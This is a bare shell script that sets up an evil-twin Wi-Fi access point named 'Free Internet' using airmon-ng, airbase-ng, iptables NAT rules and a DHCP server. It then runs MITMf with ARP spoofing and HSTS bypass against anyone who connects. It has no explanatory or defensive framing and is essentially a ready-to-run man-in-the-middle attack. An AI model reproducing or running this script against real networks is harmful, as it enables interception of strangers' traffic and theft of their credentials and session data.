echo '### 0. Cleaning up space ###'
/home/cleanup.sh 2> /dev/null
clear
echo '### 1. Starting monior mode ###'
airmon-ng check kill
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
sleep 5
echo '### 2. Starting Access Point ###'
airmon-ng check kill
airodump-ng -i wlan0 &
sleep 20
for pid in `ps -edf | grep air | awk '{print $2}'`; do kill -9 $pid; done 2> /dev/null
clear
airbase-ng -a aa:bb:cc:dd:ee:ff -c 6 --essid "Free Internet" wlan0 &
sleep 5
echo '### 3. Linking the interfaces ###'
ifconfig at0 192.168.1.129 netmask 255.255.255.128
ifconfig at0 up
sleep 5
echo '### 4. Updating Routing Tables ###'
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE
rm /var/lib/dh* 2> /dev/null
touch /var/lib/dhcp/dhcpd.leases
sleep 5
echo '### 5. Starting DHCP ###'
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
/etc/init.d/isc-dhcp-server start
tail -f /var/lib/dhcp/dhcpd.leases &
sleep 5
echo '### 6. Starting MiTMF ###'
mitmf -i at0 --gateway 192.168.1.129 --arp --spoof --hsts
